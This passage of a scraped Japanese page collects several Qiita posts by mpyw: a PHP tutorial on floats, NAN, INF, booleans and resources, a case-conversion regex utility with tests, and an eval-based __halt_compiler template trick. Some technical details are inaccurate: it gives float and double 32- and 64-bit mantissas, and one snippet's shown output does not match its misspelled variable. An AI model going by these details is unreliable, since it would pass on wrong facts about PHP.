<a href="http://ja.wikipedia.org/wiki/%E6%B5%AE%E5%8B%95%E5%B0%8F%E6%95%B0%E7%82%B9%E6%95%B0" class="autolink" rel="nofollow noopener" target="_blank">http://ja.wikipedia.org/wiki/%E6%B5%AE%E5%8B%95%E5%B0%8F%E6%95%B0%E7%82%B9%E6%95%B0</a></p>

<p>中学や高校で習った <strong>科学記法</strong> を思い出してください。</p>

<p>例： ファラデー定数<br>
$9.65 × 10^{4} \mbox{C}/\mbox{mol}$</p>

<p>この考え方はまさに <strong>浮動小数点数</strong> そのものであるとも言えます。実際には <strong>基数</strong> である <code>10</code> は <code>2</code> に変換されて管理されていますが、考え方はほとんど同じです。 <strong>「有効数字$n$桁まで計算しなさい」</strong> のような問題、ありましたよね。この有効数字部分のことを <strong>仮数</strong> と呼ぶのです。32ビットの仮数精度を持つタイプのものに <code>float</code>、その倍の64ビットの仮数精度を持つタイプのものに <code>double</code> という名前が付けられています。</p>

<h3>
<span id="phpにおける浮動小数点数" class="fragment"></span><a href="#php%E3%81%AB%E3%81%8A%E3%81%91%E3%82%8B%E6%B5%AE%E5%8B%95%E5%B0%8F%E6%95%B0%E7%82%B9%E6%95%B0"><i class="fa fa-link"></i></a>PHPにおける浮動小数点数</h3>

<ul>
<li>
<strong>float</strong> と <strong>double</strong> は同じ意味ですが、前者の方がよく用いられます。</li>
</ul>

<p>他のプログラミング言語と同じようにPHPの浮動小数点型には <code>single</code> <code>double</code> の2種類がある・・・・・・ように思えますが、<ins>実際には全て <code>double</code></ins> です。名前が2種類ついているだけで、実体は全く同じです。これには <strong><em>歴史的な理由</em></strong> があるようです。気持ち悪い屁理屈に聞こえますが、PHPにおいてこの屁理屈はこれから先何回か遭遇することになると思うので、割り切っていきましょう。<del>PHPはそういう気持ち悪い面をたくさん持った出来損ないの言語です。</del></p>

<p><strong>PHPマニュアルから見つかる</strong> <strong><em>歴史的な理由</em></strong><br>
<a href="https://www.google.co.jp/search?hl=ja&amp;q=site:php.net%20%E6%AD%B4%E5%8F%B2%E7%9A%84%E3%81%AA%E7%90%86%E7%94%B1" class="autolink" rel="nofollow noopener" target="_blank">https://www.google.co.jp/search?hl=ja&amp;q=site:php.net%20%E6%AD%B4%E5%8F%B2%E7%9A%84%E3%81%AA%E7%90%86%E7%94%B1</a></p>

<ul>
<li>一般的な表し方です。</li>
</ul>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="nb">var_dump</span><span class="p">(</span><span class="mf">1.45</span><span class="p">,</span> <span class="o">-</span><span class="mf">1.0</span><span class="p">,</span> <span class="mf">0.0</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>float(1.45)
float(-1.0)
float(0.0)
</pre></div>
</div>

<ul>
<li>科学記法を使った例です。 <code>e</code> または <code>E</code> 以降に基数 <code>10</code> を何乗するかを続けます。</li>
</ul>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="nb">var_dump</span><span class="p">(</span><span class="mf">9.6485e4</span><span class="p">);</span>  <span class="c1">// ファラデー定数</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="mf">8.9876e-9</span><span class="p">);</span> <span class="c1">// クーロン定数</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>float(96485)
float(8.9876E-9)
</pre></div>
</div>

<h3>
<span id="非数値nan-not-a-number" class="fragment"></span><a href="#%E9%9D%9E%E6%95%B0%E5%80%A4nan-not-a-number"><i class="fa fa-link"></i></a>非数値(NAN, Not a Number)</h3>

<p>PHPで一部の演算を行ってしまった時に、結果が <strong>非数値</strong> になることがあります。</p>

<ul>
<li>この値は定数 <code>NAN</code> によって定義されています。<ins>定数なので大文字小文字は区別されます。</ins>
</li>
<li>
<code>NAN</code> と何を演算しても結果は <code>NAN</code> になります。</li>
<li>
<code>NAN</code> と他の何を比較しても結果は<code>FALSE</code> になります。</li>
<li><ins><code>NAN</code> と <code>NAN</code> を比較しても結果は<code>FALSE</code> になります。</ins></li>
<li>ある値が <code>NAN</code> であるか調べるには <code>is_nan</code> 関数を使う方法1つしかありません。</li>
</ul>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="nb">var_dump</span><span class="p">(</span><span class="nb">asin</span><span class="p">(</span><span class="mf">1.1</span><span class="p">));</span> <span class="c1">// アークサインの定義域は-1から1の間</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>float(NAN)
</pre></div>
</div>

<h3>
<span id="無限大inf-infinite-" class="fragment"></span><a href="#%E7%84%A1%E9%99%90%E5%A4%A7inf-infinite-"><i class="fa fa-link"></i></a>無限大(INF, Infinite, ∞)</h3>

<p>PHPで浮動小数点数が膨大、具体的には約 $1.8 × 10 ^{308}$ 以上の値になると、その数は <strong>無限大</strong> に変換されます。</p>

<ul>
<li>この値は定数 <code>INF</code> によって定義されています。<ins>定数なので大文字小文字は区別されます。</ins>
</li>
<li>一度 <code>INF</code> になってしまったものをもとの数に戻すことは出来ません。</li>
<li>マイナス無限大も存在します。</li>
</ul>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="nb">var_dump</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span> <span class="o">*</span> <span class="nx">INF</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>float(-INF)
</pre></div>
</div>

<ul>
<li>
<code>INF</code> を用いた際の計算法則は数学界のものに従います。</li>
</ul>

<div class="code-frame" data-lang="math"><div class="highlight"><pre><span></span>\frac{1}{\mbox{INF}} = 0 \\
{\mbox{INF}} \cdot {\mbox{INF}} = \mbox{INF} \\
\frac{\mbox{INF}}{\mbox{INF}} = \mbox{NAN}
</pre></div></div>

<ul>
<li>
<code>1 / 0</code> や <code>INF / 0</code> の結果も <code>NAN</code> になると予測されますが、実際には<ins>Warningを発生して <code>FALSE</code>になります</ins>。これにも <strong><em>歴史的な理由</em></strong> があると思われます。</li>
</ul>

<div class="code-frame" data-lang="math"><div class="highlight"><pre><span></span>\frac{1}{0} = \mbox{FALSE with Warning: Division by zero} \\
\frac{\mbox{INF}}{0} = \mbox{FALSE with Warning: Division by zero}
</pre></div></div>

<h1>
<span id="論理値" class="fragment"></span><a href="#%E8%AB%96%E7%90%86%E5%80%A4"><i class="fa fa-link"></i></a>論理値</h1>

<p>さっきから何回か <code>FALSE</code> と出てきましたが、これは2つある論理値のうちの1つです。論理値とは、ある事柄 <strong>(命題)</strong> に関して、それが成り立つか <strong>(真)</strong>、成り立たないか <strong>(偽)</strong> を表すものです。</p>

<ul>
<li>真を <code>TRUE</code> 、偽を <code>FALSE</code> で表します。大文字小文字の区別はありません。</li>
<li>if文などでの条件判定には論理値が用いられます(論理値で無い場合には自動変換されます)。</li>
</ul>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

<span class="c1">// 私は一人ぼっちか？</span>
<span class="nv">$i_am_alone</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$_am_alone</span><span class="p">);</span>

<span class="c1">//　クリスマスの行方は・・・</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$i_am_alone</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s1">'Fu*king Christmas!!'</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s1">'Enjoy Happy Christmas!!'</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>bool(true)
Fu*king Christmas!!
</pre></div>
</div>

<h1>
<span id="リソース" class="fragment"></span><a href="#%E3%83%AA%E3%82%BD%E3%83%BC%E3%82%B9"><i class="fa fa-link"></i></a>リソース</h1>

<p><strong>プログラミングにおける「リソース」の意味</strong><br>
<a href="http://e-words.jp/w/E383AAE382BDE383BCE382B9.html" class="autolink" rel="nofollow noopener" target="_blank">http://e-words.jp/w/E383AAE382BDE383BCE382B9.html</a></p>

<p>PHPにおける「リソース」とは、PHPであらかじめ用意されている関数(標準関数)が作成した特別なデータという意味になります。リソース自体を直接プログラマが書き換えることは出来ません。<ins>リソースを専用の関数に渡して使う</ins>という流れになります。</p>

<p>次のコードを実行してみましょう。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

<span class="c1">// shout.txtへのファイルポインタ(ストリーム)リソースを書き込みモード(w)で開く</span>
<span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s1">'shout.txt'</span><span class="p">,</span> <span class="s1">'w'</span><span class="p">);</span>

<span class="c1">// データを書き込む</span>
<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="s1">'Fu*king Christmas!!'</span><span class="p">);</span>

<span class="c1">// ファイルポインタ(ストリーム)リソースを解放する</span>
<span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
</pre></div></div>

<p>PHPファイルが置かれたディレクトリに <code>shout.txt</code> が作成されます。しっかり <code>Fu*king Christmas!!</code> と書き込まれているかどうかも開いて確認してみてください。</p>

<p>また、<code>$fp</code> をダンプすると下記のような結果が得られます。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>resource(1) of type (stream)
</pre></div></div>

<ul>
<li>この <code>1</code> は <strong>リソースID</strong> といい、PHPコード実行中1番目に作られたリソースであることを表します。</li>
<li>この <code>stream</code> はリソースの種類を表しています。</li>
</ul>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />73位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>5</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/a5e1ce322b59c041f49d">数式に関しての要望</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-10-20 11:44:25</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[Qiita]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>PHPコードを書いていて、</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$foo</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="nv">$bar</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
</pre></div></div>

<p>のように「```」や「`」で囲まれたエリアに書く場合は問題ないのですが、この表記をそういったエリア外に書くと</p>

<p>$foo = 1; $bar = 2;</p>

<p>のようになってしまいます。<br>
エスケープを試みましたが</p>

<p>\$foo = 1; \$bar = 2;</p>

<p>対応していないようですね。<br>
エスケープできるようにしてもらえませんか？</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />74位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>4</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/421911461a1a8639c4fa">PascalCase, camelCase, snake_case を一括して揃える</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2014-02-16 00:07:29</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> <b>[正規表現]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="正規表現" class="fragment"></span><a href="#%E6%AD%A3%E8%A6%8F%E8%A1%A8%E7%8F%BE"><i class="fa fa-link"></i></a>正規表現</h1>

<p><em>PascalCase</em>, <em>camelCase</em>, <em>snake_case</em> とかいろいろあるけど一括してどれかに揃えたいなーってときに使える正規表現です。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="sr">/[A-Z0-9][^A-Z0-9_]*+|(?:\A|(?&lt;=_))[^A-Z0-9_]++|\A\z/</span>
</pre></div></div>

<h1>
<span id="実装サンプル" class="fragment"></span><a href="#%E5%AE%9F%E8%A3%85%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB"><i class="fa fa-link"></i></a>実装サンプル</h1>

<h2>
<span id="クラス定義" class="fragment"></span><a href="#%E3%82%AF%E3%83%A9%E3%82%B9%E5%AE%9A%E7%BE%A9"><i class="fa fa-link"></i></a>クラス定義</h2>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">class</span> <span class="nc">CaseUtil</span> <span class="p">{</span>

    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">pascalize</span><span class="p">(</span><span class="nv">$string</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">''</span><span class="p">,</span> <span class="nb">array_map</span><span class="p">(</span><span class="s1">'ucfirst'</span><span class="p">,</span> <span class="nx">self</span><span class="o">::</span><span class="na">parse</span><span class="p">(</span><span class="nv">$string</span><span class="p">)));</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">camelize</span><span class="p">(</span><span class="nv">$string</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nb">lcfirst</span><span class="p">(</span><span class="nx">self</span><span class="o">::</span><span class="na">pascalize</span><span class="p">(</span><span class="nv">$string</span><span class="p">));</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">snakify</span><span class="p">(</span><span class="nv">$string</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">'_'</span><span class="p">,</span> <span class="nb">array_map</span><span class="p">(</span><span class="s1">'lcfirst'</span><span class="p">,</span> <span class="nx">self</span><span class="o">::</span><span class="na">parse</span><span class="p">(</span><span class="nv">$string</span><span class="p">)));</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">parse</span><span class="p">(</span><span class="nv">$string</span><span class="p">)</span> <span class="p">{</span>
        <span class="nb">preg_match_all</span><span class="p">(</span>
            <span class="s1">'/[A-Z0-9][^A-Z0-9_]*+|(?:\A|(?&lt;=_))[^A-Z0-9_]++|\A\z/'</span><span class="p">,</span>
            <span class="nv">$string</span><span class="p">,</span>
            <span class="nv">$matches</span>
        <span class="p">);</span>
        <span class="k">return</span> <span class="nv">$matches</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
    <span class="p">}</span>

<span class="p">}</span>
</pre></div></div>

<h2>
<span id="テスト" class="fragment"></span><a href="#%E3%83%86%E3%82%B9%E3%83%88"><i class="fa fa-link"></i></a>テスト</h2>

<p>普段テスト書かないクズプログラマだけどPHPネイティブの <code>assert</code> 関数を初めて使ってみました。<del>PHPUnit導入めんどくさくて</del></p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$tests</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
    <span class="s1">'pascalize'</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
        <span class="s1">'SampleMethodTest'</span>          <span class="o">=&gt;</span> <span class="s1">'SampleMethodTest'</span><span class="p">,</span>
        <span class="s1">'sampleMethodTest'</span>          <span class="o">=&gt;</span> <span class="s1">'SampleMethodTest'</span><span class="p">,</span>
        <span class="s1">'sample_method_test'</span>        <span class="o">=&gt;</span> <span class="s1">'SampleMethodTest'</span><span class="p">,</span>
        <span class="s1">'Sample_Method_Test'</span>        <span class="o">=&gt;</span> <span class="s1">'SampleMethodTest'</span><span class="p">,</span>
        <span class="s1">'SampleMethod_Test'</span>         <span class="o">=&gt;</span> <span class="s1">'SampleMethodTest'</span><span class="p">,</span>
        <span class="s1">'_sampleMethod_____Test___'</span> <span class="o">=&gt;</span> <span class="s1">'SampleMethodTest'</span><span class="p">,</span>
        <span class="s1">'AあIいUうEえOお'</span>            <span class="o">=&gt;</span> <span class="s1">'AあIいUうEえOお'</span><span class="p">,</span>
        <span class="s1">'あいうえお'</span>                 <span class="o">=&gt;</span> <span class="s1">'あいうえお'</span><span class="p">,</span>
        <span class="s1">'_'</span>                         <span class="o">=&gt;</span> <span class="s1">''</span><span class="p">,</span>
        <span class="s1">''</span>                          <span class="o">=&gt;</span> <span class="s1">''</span><span class="p">,</span>
    <span class="p">),</span>
    <span class="s1">'camelize'</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
        <span class="s1">'SampleMethodTest'</span>          <span class="o">=&gt;</span> <span class="s1">'sampleMethodTest'</span><span class="p">,</span>
        <span class="s1">'sampleMethodTest'</span>          <span class="o">=&gt;</span> <span class="s1">'sampleMethodTest'</span><span class="p">,</span>
        <span class="s1">'sample_method_test'</span>        <span class="o">=&gt;</span> <span class="s1">'sampleMethodTest'</span><span class="p">,</span>
        <span class="s1">'Sample_Method_Test'</span>        <span class="o">=&gt;</span> <span class="s1">'sampleMethodTest'</span><span class="p">,</span>
        <span class="s1">'SampleMethod_Test'</span>         <span class="o">=&gt;</span> <span class="s1">'sampleMethodTest'</span><span class="p">,</span>
        <span class="s1">'_sampleMethod_____Test___'</span> <span class="o">=&gt;</span> <span class="s1">'sampleMethodTest'</span><span class="p">,</span>
        <span class="s1">'AあIいUうEえOお'</span>            <span class="o">=&gt;</span> <span class="s1">'aあIいUうEえOお'</span><span class="p">,</span>
        <span class="s1">'あいうえお'</span>                 <span class="o">=&gt;</span> <span class="s1">'あいうえお'</span><span class="p">,</span>
        <span class="s1">'_'</span>                         <span class="o">=&gt;</span> <span class="s1">''</span><span class="p">,</span>
        <span class="s1">''</span>                          <span class="o">=&gt;</span> <span class="s1">''</span><span class="p">,</span>
    <span class="p">),</span>
    <span class="s1">'snakify'</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
        <span class="s1">'SampleMethodTest'</span>          <span class="o">=&gt;</span> <span class="s1">'sample_method_test'</span><span class="p">,</span>
        <span class="s1">'sampleMethodTest'</span>          <span class="o">=&gt;</span> <span class="s1">'sample_method_test'</span><span class="p">,</span>
        <span class="s1">'sample_method_test'</span>        <span class="o">=&gt;</span> <span class="s1">'sample_method_test'</span><span class="p">,</span>
        <span class="s1">'Sample_Method_Test'</span>        <span class="o">=&gt;</span> <span class="s1">'sample_method_test'</span><span class="p">,</span>
        <span class="s1">'SampleMethod_Test'</span>         <span class="o">=&gt;</span> <span class="s1">'sample_method_test'</span><span class="p">,</span>
        <span class="s1">'_sampleMethod_____Test___'</span> <span class="o">=&gt;</span> <span class="s1">'sample_method_test'</span><span class="p">,</span>
        <span class="s1">'AあIいUうEえOお'</span>            <span class="o">=&gt;</span> <span class="s1">'aあ_iい_uう_eえ_oお'</span><span class="p">,</span>
        <span class="s1">'あいうえお'</span>                 <span class="o">=&gt;</span> <span class="s1">'あいうえお'</span><span class="p">,</span>
        <span class="s1">'_'</span>                         <span class="o">=&gt;</span> <span class="s1">''</span><span class="p">,</span>
        <span class="s1">''</span>                          <span class="o">=&gt;</span> <span class="s1">''</span><span class="p">,</span>
    <span class="p">),</span>
<span class="p">);</span>

<span class="k">foreach</span> <span class="p">(</span><span class="nv">$tests</span> <span class="k">as</span> <span class="nv">$func</span> <span class="o">=&gt;</span> <span class="nv">$group</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$group</span> <span class="k">as</span> <span class="nv">$from</span> <span class="o">=&gt;</span> <span class="nv">$to</span><span class="p">)</span> <span class="p">{</span>
        <span class="nb">assert</span><span class="p">(</span><span class="s2">"CaseUtil::</span><span class="si">$func</span><span class="s2">('</span><span class="si">$from</span><span class="s2">') === '</span><span class="si">$to</span><span class="s2">'"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div></div>

<p>アサーションに失敗した場所が分かりやすいように変数展開させてみました。失敗しないけど。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />75位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>4</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/b6d457bf75f76f8504ac">__halt_compiler() でキモいことしてみる</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-11-21 02:45:44</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>（ノンフレームワークな小規模開発向けに）テンプレートクラスとテンプレートファイルを結合する荒業。あんまりこんなことしない方がいいけど、 <ins>公開ディレクトリにしかファイルを置けない</ins>環境で、テンプレートファイルに直接ユーザーにアクセスされて困る場合には重宝するかも。</p>

<h2>
<span id="コード" class="fragment"></span><a href="#%E3%82%B3%E3%83%BC%E3%83%89"><i class="fa fa-link"></i></a>コード</h2>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">Template.php</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span> 

<span class="k">class</span> <span class="nc">Template</span> <span class="p">{</span>

    <span class="k">public</span> <span class="nv">$title</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span>
        <span class="nb">ob_start</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
        <span class="nv">$contents</span> <span class="o">=</span> <span class="nb">ob_get_clean</span><span class="p">();</span>
        <span class="k">eval</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span>
            <span class="no">__FILE__</span><span class="p">,</span>
            <span class="k">false</span><span class="p">,</span>
            <span class="k">null</span><span class="p">,</span>
            <span class="nx">__COMPILER_HALT_OFFSET__</span>
        <span class="p">));</span>
    <span class="p">}</span>

<span class="p">}</span>

<span class="cm">/* ここまでクラス定義 */</span>
<span class="nb">__halt_compiler</span><span class="p">();</span>
<span class="cm">/* ここからテンプレート*/</span>

<span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: application/xhtml+xml; charset=utf-8'</span><span class="p">);</span>

<span class="cp">?&gt;</span><span class="x"></span>
<span class="x">&lt;!DOCTYPE html&gt;</span>
<span class="x">&lt;html xmlns="http://www.w3.org/1999/xhtml" lang="ja"&gt;</span>
<span class="x">&lt;head&gt;</span>
<span class="x">  &lt;title&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">title</span><span class="cp">?&gt;</span><span class="x"> - サンプルサイト&lt;/title&gt;</span>
<span class="x">&lt;/head&gt;</span>
<span class="x">&lt;body&gt;</span>
<span class="x">  &lt;div id="container"&gt;</span>
<span class="x">    &lt;h1&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$title</span><span class="cp">?&gt;</span><span class="x">&lt;/h1&gt;</span>
<span class="x">    &lt;div id="contents"&gt;</span>
<span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$contents</span><span class="cp">?&gt;</span><span class="x"></span>
<span class="x">    &lt;/div&gt;</span>
<span class="x">  &lt;/div&gt;</span>
<span class="x">&lt;/body&gt;</span>
<span class="x">&lt;/html&gt;</span>
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">sample.php</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">require</span> <span class="s1">'Template.php'</span><span class="p">;</span>
<span class="nv">$tpl</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Template</span><span class="p">;</span>
<span class="nv">$tpl</span><span class="o">-&gt;</span><span class="na">title</span> <span class="o">=</span> <span class="s2">"テストページ！"</span><span class="p">;</span>
<span class="cp">?&gt;</span><span class="x"></span>
<span class="x">あ</span>
<span class="x">い</span>
<span class="x">う</span>
<span class="x">え</span>
<span class="x">お</span>
</pre></div>
</div>

<h2>
<span id="結果" class="fragment"></span><a href="#%E7%B5%90%E6%9E%9C"><i class="fa fa-link"></i></a>結果</h2>

<p><code>header</code> 関数は最初に実行されています。</p>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span> <span class="na">xmlns</span><span class="o">=</span><span class="s">"http://www.w3.org/1999/xhtml"</span> <span class="na">lang</span><span class="o">=</span><span class="s">"ja"</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>テストページ！ - サンプルサイト<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">"container"</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>テストページ！<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">"contents"</span><span class="p">&gt;</span>
あ
い
う
え
お
    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>

</pre></div></div>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />76位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>3</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/a8df41b82ebe03a72da6">n番目に文字列が現れる場所を探す</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-10-05 18:36:40</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>番目指定は</p>

<p><strong>0番目、1番目、2番目、…</strong></p>

<p>というように<ins>0以上の整数</ins>とします。<br>
想定しない値の例外処理はしていません。</p>

<h1>
<span id="strposを使う" class="fragment"></span><a href="#strpos%E3%82%92%E4%BD%BF%E3%81%86"><i class="fa fa-link"></i></a><code>strpos()</code>　を使う</h1>

<p><a href="http://php.net/manual/ja/function.strpos.php" rel="nofollow noopener" target="_blank">strpos()</a> の第3引数 <strong><em><code>$offset</code></em></strong> なんて滅多に出番ないと思ってたけど、こういう使い方ができるとは・・・</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">function</span> <span class="nf">strpos_n</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nv">$needle</span><span class="p">,</span> <span class="nv">$n</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
